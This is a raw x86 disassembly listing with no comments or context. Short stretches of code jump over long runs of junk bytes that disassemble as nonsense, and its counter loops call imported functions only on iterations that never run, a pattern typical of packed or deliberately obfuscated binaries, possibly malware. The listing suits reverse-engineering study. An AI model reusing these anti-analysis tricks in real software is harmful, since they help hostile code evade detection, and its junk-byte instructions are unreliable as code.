  408391:	mov    ecx,DWORD PTR [ebp+0x8]
  408394:	and    DWORD PTR ds:0x417e55,0x0
  40839e:	jmp    0x4083b1
  4083a3:	xor    eax,eax
  4083a5:	or     eax,DWORD PTR ds:0x417e55
  4083ab:	inc    eax
  4083ac:	mov    ds:0x417e55,eax
  4083b1:	cmp    DWORD PTR ds:0x417e55,0x1f
  4083b8:	jae    0x4083df
  4083be:	cmp    DWORD PTR ds:0x417e55,0x21
  4083c5:	jne    0x4083d4
  4083cb:	push   DWORD PTR [ebp-0x14]
  4083ce:	call   DWORD PTR ds:0x40d008
  4083d4:	jmp    0x4083a3
  4083d9:	sub    DWORD PTR ds:0x4245ca,edi
  4083df:	mov    eax,0x8a43
  4083e4:	sub    DWORD PTR ds:0x415101,0x2da0
  4083ee:	jmp    0x408517
  4083f3:	dec    ecx
  4083f4:	pushf  
  4083f5:	push   esp
  4083f6:	in     eax,dx
  4083f7:	imul   esp,ebp,0x9f63b859
  4083fd:	mov    DWORD PTR [ebp+edx*2+0x6189be87],ebp
  408404:	adc    al,0x7e
  408406:	jle    0x408412
  408408:	jg     0x408488
  40840a:	jle    0x40840e
  40840c:	xor    eax,0x9d8d8653
  408411:	adc    ch,ah
  408413:	repnz add esi,DWORD PTR [esp+ecx*8-0x775b32c6]
  40841b:	in     al,dx
  40841c:	cmp    eax,0x3f64dc83
  408421:	call   DWORD PTR [ecx-0x666af417]
  408427:	pop    ss
  408428:	add    al,0x8
  40842a:	mov    esp,0x49e8af90
  40842f:	test   eax,0x16097e8d
  408434:	xchg   esi,eax
  408435:	scas   al,BYTE PTR es:[edi]
  408436:	jno    0x4083db
  408438:	xor    ebx,DWORD PTR [ebp+0x41bc185]
  40843e:	mov    al,0xd0
  408440:	bound  ebp,QWORD PTR [ebx-0x396c0f10]
  408446:	out    0x78,eax
  408448:	mov    ebx,0x6748a711
  40844d:	and    eax,0xc17107d6
  408452:	mov    ecx,ebp
  408454:	inc    ebp
  408455:	mov    edi,0x3ff42f35
  40845a:	pop    ss
  40845b:	nop
  40845c:	ret    
  40845d:	jl     0x408411
  40845f:	xchg   esp,eax
  408460:	test   BYTE PTR [edi],dl
  408462:	rcr    BYTE PTR [ecx],1
  408464:	addr16 mov cl,0xdf
  408467:	jg     0x4084df
  408469:	mov    edi,0x59323ef7
  40846e:	pop    ss
  40846f:	in     al,dx
  408470:	je     0x4083f3
  408472:	or     DWORD PTR [ebx],ecx
  408474:	and    al,0xf1
  408476:	int    0xb0
  408478:	pop    ds
  408479:	frstor [ebx]
  40847b:	push   ss
  40847c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40847d:	push   ebx
  40847e:	ins    BYTE PTR es:[edi],dx
  40847f:	mov    bl,0xf5
  408481:	jmp    0xeff5:0xa384c74a
  408488:	inc    edi
  408489:	mov    dh,BYTE PTR [eax]
  40848b:	push   ds
  40848c:	push   ebx
  40848d:	ret    0x53ed
  408490:	xor    al,0xa0
  408492:	jg     0x40844c
  408494:	(bad)  
  408495:	mov    esp,0xc99acc94
  40849a:	test   dh,dl
  40849c:	and    BYTE PTR [eax+0x70],dh
  40849f:	cmp    BYTE PTR [eax],ah
  4084a1:	dec    esp
  4084a2:	dec    edx
  4084a3:	push   ss
  4084a4:	repz ret 
  4084a6:	ins    BYTE PTR es:[edi],dx
  4084a7:	sub    DWORD PTR [esi+eax*1-0x20],ebx
  4084ab:	pop    ebx
  4084ac:	inc    esp
  4084ad:	stc    
  4084ae:	(bad)  
  4084b0:	lea    ecx,[edx-0x2f066b2c]
  4084b6:	inc    ebp
  4084b7:	xchg   ebx,eax
  4084b8:	lods   eax,DWORD PTR ds:[esi]
  4084b9:	xchg   esi,ebx
  4084bb:	into   
  4084bc:	adc    al,0xb4
  4084be:	mul    DWORD PTR ds:0x8934f0e0
  4084c4:	sub    al,bh
  4084c6:	rcr    cl,cl
  4084c8:	into   
  4084c9:	push   ds
  4084ca:	mul    al
  4084cc:	push   edi
  4084cd:	mov    ch,BYTE PTR [esp+edx*4-0x1ce614a6]
  4084d4:	jmp    0xb9c3bbda
  4084d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084da:	inc    eax
  4084db:	pop    edi
  4084dc:	(bad)  
  4084dd:	into   
  4084de:	adc    al,0x47
  4084e0:	jle    0x408481
  4084e2:	jo     0x408513
  4084e4:	xchg   esp,eax
  4084e5:	push   ss
  4084e6:	jo     0x40850e
  4084e8:	jle    0x4084cf
  4084ea:	retf   0xec32
  4084ed:	xor    ebp,esi
  4084ef:	mov    esi,0x93540ab1
  4084f4:	dec    esp
  4084f5:	push   0x43412f3d
  4084fa:	fistp  QWORD PTR [ebp+0x37]
  4084fd:	(bad)  
  4084fe:	push   ebp
  4084ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408500:	push   ebx
  408501:	hlt    
  408502:	fsubp  st(0),st
  408504:	test   al,0xef
  408506:	stc    
  408507:	add    esp,esi
  408509:	ds stc 
  40850b:	mov    eax,ds:0x25db6104
  408510:	into   
  408511:	pop    edi
  408512:	call   DWORD PTR [eax]
  408514:	jo     0x408535
  408516:	daa    
  408517:	xor    ax,WORD PTR [ecx+0x20]
  40851b:	mov    ecx,0x3b0a
  408520:	not    DWORD PTR ds:0x41abce
  408526:	add    ax,cx
  408529:	mov    ecx,DWORD PTR ds:0x417e49
  40852f:	or     ecx,DWORD PTR ds:0x412374
  408535:	mov    DWORD PTR ds:0x417e49,ecx
  40853b:	jmp    0x408664
  408540:	sub    cl,BYTE PTR [ebp-0x31]
  408543:	xchg   esp,eax
  408544:	jns    0x4084da
  408546:	jns    0x408589
  408548:	or     eax,0xd626a896
  40854d:	push   ecx
  40854e:	(bad)  
  40854f:	nop
  408550:	jge    0x40857c
  408552:	jle    0x4085d2
  408554:	or     bh,BYTE PTR [edi+0x7e]
  408557:	jle    0x4085d4
  408559:	cmc    
  40855a:	pop    esi
  40855b:	mov    esi,0x44b15a0c
  408560:	dec    ecx
  408561:	xor    eax,0xc8e161
  408566:	xchg   ecx,eax
  408567:	inc    bl
  408569:	ins    BYTE PTR es:[edi],dx
  40856a:	sub    esi,esi
  40856c:	mov    dh,0xa
  40856e:	lods   al,BYTE PTR ds:[esi]
  40856f:	mov    al,ds:0x775d6996
  408574:	adc    DWORD PTR [edx-0x6c],esp
  408577:	or     bh,al
  408579:	jg     0x4084fc
  40857b:	aas    
  40857c:	es ins BYTE PTR es:[edi],dx
  40857e:	jmp    0x394ddf6
  408583:	mov    WORD PTR [esi-0x17],?
  408586:	push   cs
  408587:	add    ebp,ebp
  408589:	pop    edi
  40858a:	aad    0x38
  40858c:	das    
  40858d:	enter  0x3388,0x61
  408591:	cmp    dh,BYTE PTR ds:0xc3c0656d
  408597:	push   ss
  408598:	mov    ch,0x1e
  40859a:	push   0x4f
  40859c:	push   ds
  40859d:	and    ebp,DWORD PTR ds:0x2cecf42c
  4085a3:	(bad)  
  4085a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085a5:	sti    
  4085a6:	inc    esi
  4085a7:	jmp    0x4085ca
  4085a9:	aam    0xc4
  4085ab:	pusha  
  4085ac:	dec    eax
  4085ad:	cdq    
  4085ae:	stos   BYTE PTR es:[edi],al
  4085af:	sahf   
  4085b0:	dec    ebp
  4085b1:	mov    al,ds:0x98c30917
  4085b6:	fcomp  QWORD PTR [eax]
  4085b8:	bound  edi,QWORD PTR [ecx-0x658107cf]
  4085be:	adc    esi,DWORD PTR [ebx]
  4085c0:	dec    eax
  4085c1:	and    dl,bh
  4085c3:	mov    fs,ecx
  4085c5:	inc    ebp
  4085c6:	(bad)  
  4085c7:	mov    al,ds:0x65e53120
  4085cc:	push   edx
  4085cd:	loopne 0x4085c8
  4085cf:	or     al,0x79
  4085d1:	jns    0x40861d
  4085d3:	std    
  4085d4:	pop    esp
  4085d5:	rcl    dh,1
  4085d7:	sti    
  4085d8:	int3   
  4085d9:	out    dx,al
  4085da:	pop    ebx
  4085db:	int3   
  4085dc:	out    dx,al
  4085dd:	out    0x53,eax
  4085df:	sub    eax,0xe57f21f1
  4085e4:	gs pop es
  4085e6:	xchg   ecx,eax
  4085e7:	loope  0x408571
  4085e9:	sub    DWORD PTR [ebp+0x37],0xffffffab
  4085ed:	pop    edx
  4085ee:	sub    ch,BYTE PTR [edi+0x77]
  4085f1:	inc    esi
  4085f2:	jge    0x408609
  4085f4:	dec    ebp
  4085f5:	xchg   ecx,eax
  4085f6:	push   edx
  4085f7:	mov    eax,0x56f01e47
  4085fc:	mov    ebx,0x6400b490
  408601:	pop    esp
  408602:	adc    al,0x75
  408604:	jge    0x40867b
  408606:	push   0xfffffff5
  408608:	call   ebx
  40860a:	lods   al,BYTE PTR ds:[esi]
  40860b:	xchg   edi,eax
  40860c:	mov    cl,0x1e
  40860e:	pop    ebx
  40860f:	in     al,0x34
  408611:	cmp    eax,0x717967ab
  408616:	and    eax,0x1f004fd1
  40861b:	mov    al,ds:0xfec6136b
  408620:	adc    al,0xe0
  408622:	cmp    esi,DWORD PTR [ebp+edx*1-0x38]
  408626:	lock mov cl,0x47
  408629:	(bad)  
  40862a:	loope  0x4085ef
  40862c:	inc    esp
  40862d:	in     al,0xda
  40862f:	jbe    0x40861d
  408631:	ds dec esi
  408633:	mov    ds:0xab61b1e2,al
  408638:	dec    esi
  408639:	pop    edx
  40863a:	out    dx,eax
  40863b:	jmp    0x5f21:0x35a56b89
  408642:	ins    DWORD PTR es:[edi],dx
  408643:	leave  
  408644:	pop    esp
  408645:	dec    edx
  408646:	add    BYTE PTR [eax-0x42],dh
  408649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40864a:	and    al,0x47
  40864c:	int    0xb9
  40864e:	fldenv [eax]
  408650:	jne    0x40864e
  408652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408653:	(bad)  
  408654:	repnz mov DWORD PTR [esi],edx
  408657:	cs lods eax,DWORD PTR gs:[esi]
  40865a:	fldcw  WORD PTR ds:0x801d2672
  408660:	sbb    edi,ecx
  408662:	dec    ecx
  408663:	pop    eax
  408664:	movzx  eax,ax
  408667:	add    ecx,DWORD PTR ds:0x417e49
  40866d:	mov    DWORD PTR [ebp-0xc],eax
  408670:	mov    BYTE PTR [ebp-0x1],0x7f
  408674:	lea    eax,[ebp-0x1]
  408677:	and    DWORD PTR ds:0x4245c6,edx
  40867d:	mov    DWORD PTR [ebp-0x10],eax
  408680:	mov    DWORD PTR ds:0x41510d,0x1a
  40868a:	cmp    DWORD PTR ds:0x41510d,0x0
  408691:	je     0x4086bf
  408697:	cmp    DWORD PTR ds:0x41510d,0x25
  40869e:	jne    0x4086ad
  4086a4:	push   DWORD PTR [ebp-0x18]
  4086a7:	call   DWORD PTR ds:0x40d370
  4086ad:	mov    ecx,DWORD PTR ds:0x41510d
  4086b3:	dec    ecx
  4086b4:	mov    DWORD PTR ds:0x41510d,ecx
  4086ba:	jmp    0x40868a
  4086bf:	mov    al,BYTE PTR [ebp-0x1]
  4086c2:	and    DWORD PTR ds:0x4150fd,0x0
  4086cc:	mov    ecx,DWORD PTR ds:0x4150fd
  4086d2:	inc    ecx
  4086d3:	mov    DWORD PTR ds:0x4150fd,ecx
  4086d9:	cmp    DWORD PTR ds:0x4150fd,0x11
  4086e0:	jne    0x4086f1
  4086e6:	push   0x41ad87
  4086eb:	call   DWORD PTR ds:0x40d1e4
  4086f1:	cmp    DWORD PTR ds:0x4150fd,0x10
  4086f8:	jne    0x40870b
  4086fe:	mov    ecx,DWORD PTR ds:0x4150fd
  408704:	inc    ecx
  408705:	mov    DWORD PTR ds:0x4150fd,ecx
  40870b:	cmp    DWORD PTR ds:0x4150fd,0x1f
  408712:	jb     0x4086cc
  408718:	neg    ecx
  40871a:	mov    ecx,DWORD PTR [ebp-0x10]
  40871d:	xor    al,0x4a
  40871f:	or     DWORD PTR ds:0x41abe2,0x415105
  408729:	sub    al,0x34
  40872b:	mov    BYTE PTR [ecx],al
  40872d:	xor    ecx,ecx
  40872f:	jmp    0x408858
  408734:	adc    DWORD PTR [ebx+0xc],ebx
  408737:	(bad)  
  408738:	fs pop ecx
  40873a:	jmp    0x44b4d3b8
  40873f:	fcmovbe st,st(0)
  408741:	aad    0x14
  408743:	or     DWORD PTR [ecx],0x2b
  408746:	jle    0x4087c6
  408748:	or     bh,BYTE PTR [edi+0x7e]
  40874b:	jle    0x4087bf
  40874d:	int    0xa7
  40874f:	mov    edi,ecx
  408751:	push   cs
  408752:	and    esp,DWORD PTR [edx+ecx*4+0x56]
  408756:	mov    al,0x22
  408758:	sti    
  408759:	ds loop 0x408719
  40875c:	cmp    BYTE PTR [eax+eax*1-0x7f],ah
  408760:	ins    DWORD PTR es:[edi],dx
  408761:	out    dx,al
  408762:	push   0xffffff97
  408764:	retf   
  408765:	hlt    
  408766:	stc    
  408767:	mov    ah,0x7a
  408769:	ss fcmovnbe st,st(2)
  40876c:	in     eax,0xb
  40876e:	inc    edi
  40876f:	sbb    al,0x44
  408771:	adc    BYTE PTR [ebp+0x77],bh
  408774:	add    eax,0x1702acbc
  408779:	inc    ebp
  40877a:	push   ds
  40877b:	cwde   
  40877c:	inc    ebp
  40877d:	out    dx,al
  40877e:	sbb    ebx,esp
  408780:	daa    
  408781:	js     0x408745
  408783:	faddp  st(5),st
  408785:	mov    ah,BYTE PTR [edx+0x49518a62]
  40878b:	bound  ebp,QWORD PTR [eax+ebx*4]
  40878e:	dec    esp
  40878f:	mov    eax,ds:0xdda0c154
  408794:	rcr    DWORD PTR [edi+edi*1-0x45],1
  408798:	or     DWORD PTR [ecx+eax*2-0x6e1650f7],ebp
  40879f:	data16 in al,dx
  4087a1:	loop   0x40873e
  4087a3:	jmp    0x408733
  4087a5:	mov    esp,0x7e68ae6d
  4087aa:	sbb    eax,0x48c18d21
  4087af:	xor    ah,BYTE PTR [esi+0x2]
  4087b2:	out    0xf3,eax
  4087b4:	cmp    eax,0xcc01db2
  4087b9:	sub    bl,ch
  4087bb:	sub    cl,dl
  4087bd:	cmp    DWORD PTR [ecx+eax*1],ebp
  4087c0:	mov    cl,0x60
  4087c2:	mov    dl,0x9a
  4087c4:	xor    BYTE PTR [esi+0x540d21ce],dl
  4087ca:	dec    esi
  4087cb:	add    al,0xf
  4087cd:	fdiv   QWORD PTR [edx-0x3b5e7999]
  4087d3:	ja     0x408816
  4087d5:	out    dx,eax
  4087d6:	add    al,0xe7
  4087d8:	ret    0x6940
  4087db:	stos   BYTE PTR es:[edi],al
  4087dc:	sbb    bh,ah
  4087de:	pop    ds
  4087df:	push   ebp
  4087e0:	loop   0x4087f8
  4087e2:	mov    dh,0x7b
  4087e4:	sbb    eax,0xc61e387f
  4087e9:	xor    esi,edi
  4087eb:	push   edi
  4087ec:	jmp    0xbc9a:0x5804440
  4087f3:	sbb    cl,bl
  4087f5:	jae    0x408821
  4087f7:	bound  ecx,QWORD PTR [edi-0x2292771a]
  4087fd:	sti    
  4087fe:	cwde   
  4087ff:	retf   
  408800:	imul   BYTE PTR [ebp+0x44]
  408803:	sub    eax,DWORD PTR [ecx+ebx*1-0x13]
  408807:	das    
  408808:	gs in  al,0x72
  40880b:	fisub  DWORD PTR [eax]
  40880d:	xor    DWORD PTR [edi+0x23],ecx
  408810:	int3   
  408811:	fdiv   QWORD PTR ds:[esi-0x7710fe9e]
  408818:	in     eax,dx
  408819:	inc    ecx
  40881a:	ins    BYTE PTR es:[edi],dx
  40881b:	mov    esp,0x9b025ed3
  408820:	inc    ebx
  408821:	cmp    eax,0x56051109
  408826:	fsub   st(4),st
  408828:	mov    WORD PTR [ebx],ds
  40882a:	adc    DWORD PTR [edx+ebp*4-0x6d],edx
  40882e:	pop    eax
  40882f:	iret   
  408830:	push   ds
  408831:	push   ebx
  408832:	pop    ecx
  408833:	dec    ebp
  408834:	dec    ecx
  408835:	pop    ebp
  408836:	xchg   edx,eax
  408837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408838:	ret    
  408839:	(bad)  [ebx+0x9]
  40883c:	jmp    0x6d3a:0x507c5dc1
  408843:	popf   
  408844:	push   ecx
  408845:	cmp    ebx,esi
  408847:	pop    eax
  408848:	(bad)  
  40884a:	push   ds
  40884b:	(bad)  
  40884d:	xchg   edx,eax
  40884e:	fcmovnbe st,st(0)
  408850:	mov    ecx,DWORD PTR [ebp+0x1a]
  408853:	shl    BYTE PTR [ecx],cl
  408855:	popa   
  408856:	add    BYTE PTR [edi+eax*8],bh
  408859:	inc    ebp
  40885a:	clc    
  40885b:	cmp    BYTE PTR [ebp+0x1581f89c],al
  408861:	jo     0x408886
  408863:	inc    ecx
  408864:	add    BYTE PTR [esi-0x38ffffe9],al
  40886a:	inc    ebp
  40886b:	lock cmp eax,DWORD PTR [ebp+0x458bf89c]
  408872:	clc    
  408873:	xor    ecx,ecx
  408875:	add    ecx,DWORD PTR ds:0x417e59
  40887b:	sbb    DWORD PTR ds:0x41abde,ecx
  408881:	mov    ecx,0x7510859
  408886:	add    DWORD PTR ds:0x41abe6,0x417e51
  408890:	push   esi
  408891:	and    DWORD PTR ds:0x417e59,0x0
  40889b:	mov    esi,DWORD PTR ds:0x417e59
  4088a1:	inc    esi
  4088a2:	mov    DWORD PTR ds:0x417e59,esi
  4088a8:	cmp    DWORD PTR ds:0x417e59,0x9
  4088af:	jne    0x4088f1
  4088b5:	push   0x41ad06
  4088ba:	push   DWORD PTR [ebp-0x10]
  4088bd:	push   DWORD PTR [ebp-0x14]
  4088c0:	push   0x6f38
  4088c5:	push   0x208a
  4088ca:	push   0x8fdb
  4088cf:	push   0x1d69
  4088d4:	push   DWORD PTR [ebp-0x20]
  4088d7:	push   0x57cc
  4088dc:	push   DWORD PTR [ebp-0x10]
  4088df:	push   DWORD PTR [ebp-0x28]
  4088e2:	push   DWORD PTR [ebp-0x24]
  4088e5:	push   DWORD PTR [ebp-0x28]
  4088e8:	push   DWORD PTR [ebp-0x1c]
  4088eb:	call   DWORD PTR ds:0x40d374
  4088f1:	cmp    DWORD PTR ds:0x417e59,0x8
  4088f8:	jne    0x40890d
  4088fe:	xor    esi,esi
  408900:	add    esi,DWORD PTR ds:0x417e59
  408906:	inc    esi
  408907:	mov    DWORD PTR ds:0x417e59,esi
  40890d:	cmp    DWORD PTR ds:0x417e59,0x13
  408914:	jb     0x40889b
  40891a:	xor    eax,ecx
  40891c:	mov    esi,0x32729f
  408921:	add    eax,esi
  408923:	jmp    0x408930
  408928:	mov    dl,BYTE PTR [ebp-0x1]
  40892b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40892f:	inc    eax
  408930:	cmp    eax,0x40
  408933:	jb     0x408928
  408939:	mov    edx,DWORD PTR [ebp-0x8]
  40893c:	mov    eax,DWORD PTR [ebp-0xc]
  40893f:	jmp    0x408a68
  408944:	sub    eax,0xb98f82f6
  408949:	fwait
  40894a:	and    DWORD PTR [eax+eax*1-0x3f28be99],edx
  408951:	out    0x88,al
  408953:	adc    DWORD PTR ds:0xa7e7e28,eax
  408959:	jg     0x4089d9
  40895b:	jle    0x408964
  40895d:	bound  bp,DWORD PTR [eax+0xf]
  408961:	mov    ebp,0xe39ae3c1
  408966:	push   0x6c
  408968:	push   ebp
  408969:	pop    es
  40896a:	mov    WORD PTR [esi],fs
  40896c:	jl     0x4089b0
  40896e:	jp     0x408927
  408970:	xor    al,0x83
  408972:	dec    ebp
  408973:	xchg   edi,eax
  408974:	adc    DWORD PTR [edi],edx
  408976:	ds pop ecx
  408978:	ja     0x40895e
  40897a:	loope  0x40899c
  40897c:	inc    ecx
  40897d:	cdq    
  40897e:	mov    esi,0xff266c89
  408983:	sbb    bl,BYTE PTR [ecx]
  408985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408986:	inc    esp
  408987:	jecxz  0x4089fc
  408989:	jb     0x408996
  40898b:	mov    WORD PTR [edi+0xf],?
  40898e:	ja     0x4089a4
  408990:	out    dx,eax
  408991:	jecxz  0x408956
  408993:	(bad)  
  408994:	xor    DWORD PTR [ebp+eax*4+0x68540eb],edi
  40899b:	lods   eax,DWORD PTR ds:[esi]
  40899c:	and    BYTE PTR [edx],al
  40899e:	add    BYTE PTR [ecx+edx*2],ah
  4089a1:	jo     0x4089b3
  4089a3:	xchg   ebp,eax
  4089a4:	jmp    0xa316ac1e
  4089a9:	mov    al,ds:0xb6e1ebe0
  4089ae:	and    DWORD PTR [edi-0x7b],esi
  4089b1:	clc    
  4089b2:	fdivr  st(5),st
  4089b4:	call   0xf0dd:0x9d83d90f
  4089bb:	add    al,0xe5
  4089bd:	sbb    DWORD PTR [ecx],0x4494e0ac
  4089c3:	pop    ecx
  4089c4:	sub    al,0xef
  4089c6:	shl    ebx,cl
  4089c8:	aas    
  4089c9:	(bad)  
  4089ca:	lock xchg edx,eax
  4089cc:	pop    edx
  4089cd:	cwde   
  4089ce:	sbb    DWORD PTR [edi-0x74],0x8
  4089d2:	xor    dl,BYTE PTR [esi+0x1d]
  4089d5:	scas   al,BYTE PTR es:[edi]
  4089d6:	call   0xda4a05e9
  4089db:	ja     0x4089e4
  4089dd:	jp     0x408a03
  4089df:	push   0x6
  4089e1:	ret    0x6034
  4089e4:	and    al,0xb7
  4089e6:	cs cs gs cdq 
  4089ea:	aaa    
  4089eb:	jo     0x408986
  4089ed:	out    dx,eax
  4089ee:	jno    0x40897e
  4089f0:	(bad)  
  4089f1:	xor    ch,bl
  4089f3:	push   ds
  4089f4:	(bad)  
  4089f5:	pusha  
  4089f6:	jnp    0x408a0d
  4089f8:	shl    BYTE PTR [esp+ebp*8+0x49],1
  4089fc:	adc    DWORD PTR [ecx+0x48],esi
  4089ff:	inc    esp
  408a00:	mov    ecx,0x794b902f
  408a05:	cmp    dl,BYTE PTR [ebp-0x19243130]
  408a0b:	shr    BYTE PTR ds:0x7fbc6745,cl
  408a11:	cmp    bh,BYTE PTR [edx-0x29b4d2af]
  408a17:	ds int 0x60
  408a1a:	lds    edx,FWORD PTR [edx-0x7c2f7448]
  408a20:	and    cl,BYTE PTR [eax]
  408a22:	and    DWORD PTR [ecx-0x5f],ecx
  408a25:	mov    edi,DWORD PTR [edi]
  408a27:	add    bh,BYTE PTR ds:0xf340b2cd
  408a2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a2e:	sbb    eax,esp
  408a30:	stos   BYTE PTR es:[edi],al
  408a31:	push   es
  408a32:	mov    cl,0xac
  408a34:	jmp    0xdc552145
  408a39:	fs je  0x408a78
  408a3c:	push   eax
  408a3d:	pushf  
  408a3e:	sbb    DWORD PTR [edi-0x6b73fb91],0x60
  408a45:	call   0x5b48:0x1f855ed5
  408a4c:	in     eax,dx
  408a4d:	inc    edx
  408a4e:	adc    dh,BYTE PTR [ecx-0x4c10a12d]
  408a54:	leavew 
  408a56:	(bad)  
  408a57:	test   DWORD PTR [edx-0x3f],0x67c20f3f
  408a5e:	pusha  
  408a5f:	pop    esi
  408a60:	in     eax,dx
  408a61:	in     eax,dx
  408a62:	fistp  DWORD PTR [edi]
  408a64:	addr16 and eax,0xd133fde0
  408a6a:	add    edx,esi
  408a6c:	cmp    edx,eax
  408a6e:	je     0x408d06
  408a74:	jmp    0x408b9d
  408a79:	xor    ecx,DWORD PTR [edx+ebx*1-0x14]
  408a7d:	cdq    
  408a7e:	js     0x408a69
  408a80:	popa   
  408a81:	cmp    ax,0xba8d
  408a85:	stos   DWORD PTR es:[edi],eax
  408a86:	outs   dx,BYTE PTR ds:[esi]
  408a87:	xchg   edi,eax
  408a88:	mov    dl,BYTE PTR [ecx]
  408a8a:	sub    DWORD PTR [esi+0x7e],edi
  408a8d:	or     bh,BYTE PTR [edi+0x7e]
  408a90:	jle    0x408a1e
  408a92:	mov    ecx,0x4e81ba6
  408a97:	sub    al,0x57
  408a99:	out    dx,al
  408a9a:	into   
  408a9b:	(bad)  
  408a9c:	mov    BYTE PTR [edi],ch
  408a9e:	popf   
  408a9f:	jge    0x408a8c
  408aa1:	fild   DWORD PTR [edi]
  408aa3:	add    al,0xff
  408aa5:	inc    eax
  408aa6:	add    esi,DWORD PTR [edx+0x58b83c82]
  408aac:	sub    DWORD PTR [ebx-0x7e],ecx
  408aaf:	test   al,0x80
  408ab1:	mov    ah,0xf1
  408ab3:	test   BYTE PTR [ecx+ebx*1],dh
  408ab6:	sub    eax,0xbb6de4c1
  408abb:	xor    eax,0xc2a413d8
  408ac0:	dec    ebx
  408ac1:	cmp    ebp,0x2a5209f6
  408ac7:	and    eax,0xcf07cbb9
  408acc:	rcr    dh,1
  408ace:	mov    esp,0xa7293b61
  408ad3:	push   ebp
  408ad4:	jle    0x408ac5
  408ad6:	out    dx,eax
  408ad7:	ret    
  408ad8:	add    dl,dl
  408ada:	and    BYTE PTR [edi-0x7412edbb],0xd
  408ae1:	mov    ebp,0xda5c274
  408ae6:	mov    ah,0x43
  408ae8:	cwde   
  408ae9:	outs   dx,BYTE PTR ds:[esi]
  408aea:	mov    ebp,0x2af9f28
  408aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408af0:	adc    cl,ah
  408af2:	(bad)  
  408af4:	into   
  408af5:	cs mov ebx,0x7c92c277
  408afb:	mov    edi,0x7f1f1cac
  408b00:	mov    dh,0x58
  408b02:	mov    edi,0x730cabf3
  408b07:	push   es
  408b08:	xor    eax,0xe1b5bf47
  408b0d:	xchg   edi,eax
  408b0e:	xchg   edx,eax
  408b0f:	push   ebp
  408b10:	xlat   BYTE PTR ds:[ebx]
  408b11:	ins    DWORD PTR es:[edi],dx
  408b12:	retf   0x89dd
  408b15:	sbb    al,0x2f
  408b17:	sub    dl,BYTE PTR [edx]
  408b19:	sti    
  408b1a:	rcr    al,0x82
  408b1d:	pusha  
  408b1e:	stos   DWORD PTR es:[edi],eax
  408b1f:	nop
  408b20:	or     al,0xf1
  408b22:	mov    bl,0xc2
  408b24:	repz jp 0x408aaa
  408b27:	retf   
  408b28:	lods   eax,DWORD PTR ds:[esi]
  408b29:	dec    esi
  408b2a:	rcr    BYTE PTR [edi-0x281f93db],1
  408b30:	and    bh,al
  408b32:	sbb    al,0x5b
  408b34:	mov    al,BYTE PTR ds:0xfbc9365
  408b3a:	js     0x408b82
  408b3c:	mov    dh,0x97
  408b3e:	popa   
  408b3f:	aam    0x83
  408b41:	daa    
  408b42:	pop    esp
  408b43:	xlat   BYTE PTR ds:[ebx]
  408b44:	aad    0x99
  408b46:	mov    dl,bh
  408b48:	dec    edx
  408b49:	sbb    al,0xa5
  408b4b:	imul   esp,DWORD PTR [ecx-0x478f1e8b],0xffffff96
  408b52:	push   es
  408b53:	in     eax,0x96
  408b55:	mov    esi,0x5f9b0730
  408b5a:	scas   eax,DWORD PTR es:[edi]
  408b5b:	scas   al,BYTE PTR es:[edi]
  408b5c:	jle    0x408b13
  408b5e:	(bad)  
  408b5f:	(bad)  
  408b60:	mov    eax,0xaa4379cf
  408b65:	dec    ecx
  408b66:	push   ecx
  408b67:	fstp   QWORD PTR [esi]
  408b69:	bswap  eax
  408b6b:	out    dx,eax
  408b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b6d:	dec    esp
  408b6e:	sbb    bl,BYTE PTR [edi]
  408b70:	xor    ecx,DWORD PTR [ecx+ecx*4+0xbfaa264]
  408b77:	mov    bh,0x70
  408b79:	dec    edx
  408b7a:	and    eax,0xa8dbbf60
  408b7f:	add    al,0x83
  408b81:	jnp    0x408b2d
  408b83:	rcr    DWORD PTR [edx-0x5d85a5ca],0xdc
  408b8a:	xchg   BYTE PTR [esi],dh
  408b8c:	dec    ebp
  408b8d:	call   0xc024c49d
  408b92:	lahf   
  408b93:	dec    ecx
  408b94:	fisub  WORD PTR [ebp+0x7143929a]
  408b9a:	jno    0x408b57
  408b9c:	mov    dl,0x53
  408b9e:	push   edi
  408b9f:	mov    edi,DWORD PTR [ebp+0x8]
  408ba2:	mov    eax,0x8a43
  408ba7:	xor    ax,WORD PTR [edi+edx*4+0x2]
  408bac:	mov    edi,0x3b0a
  408bb1:	add    ax,di
  408bb4:	movzx  eax,ax
  408bb7:	mov    DWORD PTR [ebp-0x14],eax
  408bba:	mov    eax,DWORD PTR [ebp+0x8]
  408bbd:	jmp    0x408ce6
  408bc2:	(bad)  
  408bc3:	fcom   DWORD PTR [edx+eax*8]
  408bc6:	sub    dl,ah
  408bc8:	clc    
  408bc9:	fcomp  DWORD PTR [ebx+0x331369bd]
  408bcf:	mov    ebp,0x2e2dd34a
  408bd4:	jle    0x408c54
  408bd6:	or     bh,BYTE PTR [edi+0x7e]
  408bd9:	jle    0x408c0e
  408bdb:	pop    es
  408bdc:	out    0xbf,eax
  408bde:	out    0xe9,al
  408be0:	aam    0x96
  408be2:	out    0x64,eax
  408be4:	mov    bl,0xcb
  408be6:	loope  0x408c24
  408be8:	sub    esi,DWORD PTR [ebp+0x8]
  408beb:	test   DWORD PTR [edi],0x412ff503
  408bf1:	push   ebp
  408bf2:	adc    al,0x44
  408bf4:	xor    al,0xb3
  408bf6:	retf   0x7e06
  408bf9:	frstor [edx+0x6f]
  408bfc:	into   
  408bfd:	mov    ch,BYTE PTR [ebx]
  408bff:	dec    edi
  408c00:	dec    ecx
  408c01:	addr16 jb 0x408bc8
  408c04:	lods   al,BYTE PTR ds:[esi]
  408c05:	xor    DWORD PTR [ebp-0x41f89fff],edx
  408c0b:	sub    BYTE PTR [ebx+0x4ac8fe59],dh
  408c11:	xor    DWORD PTR [ebp-0x49],edx
  408c14:	and    DWORD PTR [ebp-0x60],0xd657f42a
  408c1b:	lock add cl,bh
  408c1e:	retf   0xfb61
  408c21:	and    esp,eax
  408c23:	jns    0x408bab
